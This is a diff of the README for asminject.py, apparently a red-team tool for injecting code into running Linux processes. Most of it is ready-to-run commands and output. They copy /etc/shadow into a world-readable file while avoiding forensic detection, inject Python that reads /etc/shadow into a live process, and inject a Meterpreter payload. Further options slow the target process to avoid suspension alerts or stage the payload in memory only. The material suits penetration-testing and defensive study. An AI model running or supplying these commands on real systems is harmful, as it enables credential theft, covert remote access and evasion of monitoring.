@@ -45,9 +45,62 @@ readelf -a --wide /usr/bin/python2.7 | grep DEFAULT | grep FUNC | sed 's/  / /g'
 
 If you are injecting code into a containerized process from outside the container, you'll need to use the copy of each binary *from inside the container*, or you'll get the wrong data.
 
-## Example 1: Execute arbitrary Python code inside an existing Python process
+# Examples
 
-Launch a harmless Python process that simulates one with access to super-secret, sensitive data:
+## Create a world-readable copy of a file using only Linux syscalls
+
+This code requires no relative offset information, because it's all done using Linux syscalls. It may also help avoid some methods of forensic detection versus using the *cp*, *cat*, or other commands.
+
+```
+# python3 ./asminject.py 1544016 asm/x86-64/copy_file_using_syscalls.s --var sourcefile "/etc/shadow" --var destfile "/tmp/shadow_copied_using_syscalls.txt" --stop-method "slow" --pause false --stage-mode mem
+
+                     .__            __               __
+  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
+ / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
+/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
+\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
+        \/                   \/\______|    \/     \/     \/|__|   \/
+
+asminject.py
+v0.3
+Ben Lincoln, Bishop Fox, 2021-08-30
+https://github.com/BishopFox/asminject
+based on dlinject, which is Copyright (c) 2019 David Buchanan
+dlinject source: https://github.com/DavidBuchanan314/dlinject
+
+...omitted for brevity...
+[*] Waiting for stage 1
+[*] RSP is 0x00007ffdd7d1bba8
+[*] Value at RSP is 0x0000000000000000
+[*] MMAP'd block is 0x00007f44f259c000
+[*] Writing stage 2 to 0x00007f44f259c000 in target memory
+[*] Writing 0x01 to 0x00007ffdd7d1bba8 in target memory to indicate OK
+[*] Stage 2 proceeding
+[*] Returning to normal time...
+[*] Setting process priority for asminject.py (PID: 1544030) to 0
+[*] Setting process priority for target process (PID: 1544016) to 0
+[*] Setting CPU affinity for target process (PID: 1544016) to [0, 1]
+[+] Done!
+                                                                                                                                                     
+# ls -al /tmp
+
+...omitted for brevity...
+-rwxr-xr-x  1 root       root        1766 Aug 31 11:56 shadow_copied_using_syscalls.txt
+...omitted for brevity...
+                                                                                                                                                     
+# cat /tmp/shadow_copied_using_syscalls.txt 
+
+root:!:18704:0:99999:7:::
+daemon:*:18704:0:99999:7:::
+bin:*:18704:0:99999:7:::
+sys:*:18704:0:99999:7:::
+sync:*:18704:0:99999:7:::
+...omitted for brevity...
+```
+
+## Execute arbitrary Python code inside an existing Python process
+
+Launch a harmless Python process that simulates one with access to super-secret, sensitive data. Note the use of *python2* specifically. For *python3* target  processes, you'll most likely need to use the *--non-pic-binary* option discussed later in this document.
 
 ```
 $ sudo python2 ./calling_script.py
@@ -64,40 +117,9 @@ In a separate terminal, locate the process and inject some arbitrary Python code
 
 user     2144294  0.5  0.1  13908  7828 pts/2    S+   15:20   0:00 python2 ./calling_script.py
 
-# python3 ./asminject.py 2144294 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-some_machine-python2.7.txt --pause --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
+# python3 ./asminject.py 2144294 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-some_machine-python2.7.txt --pause --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
 
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
-
-asminject.py
-v0.1
-Ben Lincoln, Bishop Fox, 2021-06-07
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
-[*] Sending SIGSTOP
-[*] Waiting for process to stop...
-[*] RIP: 0x7fb8b2389e8e
-[*] RSP: 0x7ffc68bea978
-[*] /usr/bin/python2.7: 0x0000556076bbb000
-[*] /usr/lib/locale/locale-archive: 0x00007fb8b1e3e000
-[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007fb8b2613000
-[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007fb8b229b000
-[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007fb8b25c6000
-[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007fb8b2460000
-[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007fb8b25cc000
-[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007fb8b25c1000
-[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007fb8b25a4000
-[*] 0: 0x0000556076f31000
-[*] [heap]: 0x0000556077db9000
-[*] [stack]: 0x00007ffc68bcc000
-[*] [vdso]: 0x00007ffc68bf8000
-[*] [vvar]: 0x00007ffc68bf4000
+...omitted for brevity...
 [*] Writing assembled binary to /tmp/tmpw5w72z5m.o
 [*] Wrote first stage shellcode
 [*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
@@ -124,7 +146,7 @@ bin:*:18704:0:99999:7:::
 sys:*:18704:0:99999:7:::
 ```
 
-## Example 2: Inject Meterpreter into an existing Python process
+## Inject Meterpreter into an existing Python process
 
 Launch a harmless Python process that simulates one with access to super-secret, sensitive data:
 
@@ -172,39 +194,9 @@ In a third terminal, locate the process and inject the Meterpreter payload into 
 root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python2 ./calling_script.py
 root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python2 ./calling_script.py
 
- python3 ./asminject.py 2144476 /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/lmrt11443 --pause --precompiled
+# python3 ./asminject.py 2144476 /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/lmrt11443 --pause --precompiled
 
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
-
-asminject.py
-v0.1
-Ben Lincoln, Bishop Fox, 2021-06-07
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
-[*] Sending SIGSTOP
-[*] RIP: 0x7f550c04ee8e
-[*] RSP: 0x7ffc2a975a28
-[*] /usr/bin/python2.7: 0x0000558e478a4000
-[*] /usr/lib/locale/locale-archive: 0x00007f550bb03000
-[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f550c2d8000
-[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f550bf60000
-[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f550c28b000
-[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f550c125000
-[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f550c291000
-[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f550c286000
-[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f550c269000
-[*] 0: 0x0000558e47c1a000
-[*] [heap]: 0x0000558e48fbc000
-[*] [stack]: 0x00007ffc2a956000
-[*] [vdso]: 0x00007ffc2a9f1000
-[*] [vvar]: 0x00007ffc2a9ed000
+...omitted for brevity...
 [*] Writing assembled binary to /tmp/tmp78ods3rv.o
 [*] Wrote first stage shellcode
 [*] Wrote stage 2 to '/tmp/tmpcmwfovsm'
@@ -229,25 +221,25 @@ Meterpreter  : x64/linux
 
 ```
 
-## Example 3: Using "slow" mode to help avoid triggerinng alerts related to process suspension
+# Features
+
+## Using "slow" mode to help avoid triggering alerts related to process suspension
+
+*asminject.py* supports four methods for pre/post-injection handling of the target process. Three of those methods are borrowed from the original [dlinject.py](https://github.com/DavidBuchanan314/dlinject):
+
+* Send a suspend (SIGSTOP) signal before injection, and a resume (SIGCONT) message after injection
+** This is reliable, but is somewhat intrusive. Very paranoid software might use it as an indication of tampering
+* For containerized systems, using *cgroups* "freezing"
+** Reliable, but not an option for non-containerized systems
+* Do nothing and hope the target process doesn't step on the injected code while it's being written
+** Unreliable
+
+*asminject.py* adds a fourth option: increasing the priority of its own process and decreasing the priority of the target process. This "slow" mode generally allows it to act like [Quicksilver in _X-Men: Days of Future Past_](https://youtu.be/T9GFyZ5LREQ?t=32), making its changes to the target process at lightning speed. The target process is still running, but so slowly relative to *asminject.py* that it may as well be suspended.
 
 ```
 # python3 ./asminject.py 1470158 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false
 
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
-
-asminject.py
-v0.2
-Ben Lincoln, Bishop Fox, 2021-08-30
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
+...omitted for brevity...
 [*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
 [*] Current process priority for asminject.py (PID: 1470165) is 0
 [*] Current CPU affinity for asminject.py (PID: 1470165) is [0, 1]
@@ -256,27 +248,7 @@ dlinject source: https://github.com/DavidBuchanan314/dlinject
 [*] Setting process priority for asminject.py (PID: 1470165) to -20
 [*] Setting process priority for target process (PID: 1470158) to 20
 [*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
-[*] RIP: 0x7fdbf1322e8e
-[*] RSP: 0x7ffe6deb9ef8
-[*] /usr/bin/python2.7: 0x0000564f2a554000
-[*] /usr/lib/locale/locale-archive: 0x00007fdbf0dd7000
-[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007fdbf15ad000
-[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007fdbf1234000
-[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007fdbf155f000
-[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007fdbf13f9000
-[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007fdbf1565000
-[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007fdbf155a000
-[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007fdbf153d000
-[*] 0: 0x0000564f2a8ca000
-[*] [heap]: 0x0000564f2bdc9000
-[*] [stack]: 0x00007ffe6de9b000
-[*] [vdso]: 0x00007ffe6df75000
-[*] [vvar]: 0x00007ffe6df71000
-[*] Writing assembled binary to /tmp/tmpfuwj2jq0.o
-[*] Wrote first stage shellcode
-[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
-[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
-[*] Writing assembled binary to /tmp/tmp79q8enyd.o
+...omitted for brevity...
 [*] Wrote stage 2 to '/tmp/tmppjmn1rr6'
 [*] Returning to normal time...
 [*] Setting process priority for asminject.py (PID: 1470165) to 0
@@ -286,7 +258,7 @@ dlinject source: https://github.com/DavidBuchanan314/dlinject
 
 ```
 
-## Example 4: Specifying non-PIC code
+## Specifying non-PIC code
 
 Some binaries are compiled without the position-independent code build option (including, strangely enough, Python 3.x, even though 2.x had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If *asminject.py* detects a low base address (typically indicative of this condition), it will include a warning:
 
@@ -299,107 +271,22 @@ As the message indicates, this type of binary can be manually flagged using one 
 ```
 # python3 ./asminject.py 1470214 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python3.9-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --pause false
 
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
-
-asminject.py
-v0.2
-Ben Lincoln, Bishop Fox, 2021-08-30
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
-[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
-[*] Current process priority for asminject.py (PID: 1470219) is 0
-[*] Current CPU affinity for asminject.py (PID: 1470219) is [0, 1]
-[*] Current process priority for target process (PID: 1470214) is 0
-[*] Current CPU affinity for target process (PID: 1470214) is [0, 1]
-[*] Setting process priority for asminject.py (PID: 1470219) to -20
-[*] Setting process priority for target process (PID: 1470214) to 20
-[*] Setting CPU affinity for target process (PID: 1470214) to [0, 1]
-[*] RIP: 0x7f86441bde8e
-[*] RSP: 0x7fff5bc4e738
+...omitted for brevity...
 [*] Handling '/usr/bin/python3.9' as non-PIC binary
 [*] /usr/bin/python3.9: 0x0000000000000000
-[*] /usr/lib/locale/locale-archive: 0x00007f8643de5000
-[*] /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache: 0x00007f8644472000
-[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f8644479000
-[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f86440cf000
-[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f864442b000
-[*] /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.12: 0x00007f86442b3000
-[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f86442e2000
-[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f8644431000
-[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f8644426000
-[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f8644296000
-[*] 0: 0x000000000093b000
-[*] [heap]: 0x0000000000a68000
-[*] [stack]: 0x00007fff5bc30000
-[*] [vdso]: 0x00007fff5bdbf000
-[*] [vvar]: 0x00007fff5bdbb000
-[*] Writing assembled binary to /tmp/tmpuufiyykt.o
-[*] Wrote first stage shellcode
-[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
-[*] Using '/usr/bin/python3.9' for regex placeholder '.+/python[0-9\.]+$' in assembly code
-[*] Writing assembled binary to /tmp/tmpp73j5_e4.o
-[*] Wrote stage 2 to '/tmp/tmpsxhy1l3y'
-[*] Returning to normal time...
-[*] Setting process priority for asminject.py (PID: 1470219) to 0
-[*] Setting process priority for target process (PID: 1470214) to 0
-[*] Setting CPU affinity for target process (PID: 1470214) to [0, 1]
+...omitted for brevity...
 [+] Done!
 
 ```
 
-## Example 5: Using memory-only staging
+## Using memory-only staging
 
-asminject.py currently defaults to a file-based second stage (based on the one in dlinject.py), but supports memory-only staging as well:
+*asminject.py* currently defaults to a file-based second stage (based on the one in *dlinject.py*), but supports memory-only staging as well:
 
 ```
- python3 ./asminject.py 1472534 /mnt/hgfs/c/Users/blincoln/Documents/GitHub/asminject/asm/x86-64/execute_python_code-01.s --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false --stage-mode mem
+# python3 ./asminject.py 1472534 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false --stage-mode mem
 
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
-
-asminject.py
-v0.2
-Ben Lincoln, Bishop Fox, 2021-08-30
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
-[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
-[*] Current process priority for asminject.py (PID: 1472539) is 0
-[*] Current CPU affinity for asminject.py (PID: 1472539) is [0, 1]
-[*] Current process priority for target process (PID: 1472534) is 0
-[*] Current CPU affinity for target process (PID: 1472534) is [0, 1]
-[*] Setting process priority for asminject.py (PID: 1472539) to -20
-[*] Setting process priority for target process (PID: 1472534) to 20
-[*] Setting CPU affinity for target process (PID: 1472534) to [0, 1]
-[*] RIP: 0x7f89ea341e8e
-[*] RSP: 0x7ffd409c1278
-[*] /usr/bin/python2.7: 0x00005615556d9000
-[*] /usr/lib/locale/locale-archive: 0x00007f89e9df6000
-[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f89ea5cc000
-[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f89ea253000
-[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f89ea57e000
-[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f89ea418000
-[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f89ea584000
-[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f89ea579000
-[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f89ea55c000
-[*] 0: 0x0000561555a4f000
-[*] [heap]: 0x0000561556a8b000
-[*] [stack]: 0x00007ffd409a3000
-[*] [vdso]: 0x00007ffd409f3000
-[*] [vvar]: 0x00007ffd409ef000
-[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
+...omitted for brevity...
 [*] Writing assembled binary to /tmp/tmprdbl1tj9.o
 [*] RSP is 0x00007ffd409c1278
 [*] Value at RSP is 0x00007f89ea2d489a
@@ -443,6 +330,10 @@ dlinject source: https://github.com/DavidBuchanan314/dlinject
 ```
 
 ### Version history
+
+#### 0.4 (2021-08-31)
+
+- Added copy-file-using-syscalls code
 
 #### 0.3 (2021-08-30)
 
